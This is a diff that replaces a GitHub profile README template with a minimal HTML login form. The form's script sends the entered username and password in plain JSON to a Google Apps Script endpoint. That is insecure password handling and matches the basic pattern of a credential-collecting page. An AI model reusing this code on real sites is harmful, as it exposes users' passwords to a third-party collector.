@@ -1,16 +1,39 @@
-## Hi there 👋
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Login Page</title>
+</head>
+<body>
+  <h2>Login</h2>
+  <form id="loginForm">
+    <label>Username:</label>
+    <input type="text" id="username" required><br><br>
+    <label>Password:</label>
+    <input type="password" id="password" required><br><br>
+    <button type="submit">Login</button>
+  </form>
 
-<!--
-**Ronit-Adhav/Ronit-Adhav** is a ✨ _special_ ✨ repository because its `README.md` (this file) appears on your GitHub profile.
+  <script>
+    document.getElementById("loginForm").addEventListener("submit", function(e) {
+      e.preventDefault();
 
-Here are some ideas to get you started:
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
 
-- 🔭 I’m currently working on ...
-- 🌱 I’m currently learning ...
-- 👯 I’m looking to collaborate on ...
-- 🤔 I’m looking for help with ...
-- 💬 Ask me about ...
-- 📫 How to reach me: ...
-- 😄 Pronouns: ...
-- ⚡ Fun fact: ...
--->
+      fetch("https://script.google.com/macros/s/AKfycbxP2yaGd6XHDpvbr9MIsAaKemDrYk0dB5zTt6nYjh3b0AqsD6rxhURzXwvb8OJZueUV/exec", {
+        method: "POST",
+        body: JSON.stringify({ username, password }),
+        headers: { "Content-Type": "application/json" }
+      })
+      .then(res => res.text())
+      .then(response => {
+        alert("Response from server: " + response);
+        document.getElementById("loginForm").reset();
+      })
+      .catch(err => alert("Error: " + err));
+    });
+  </script>
+</body>
+</html>
+
+
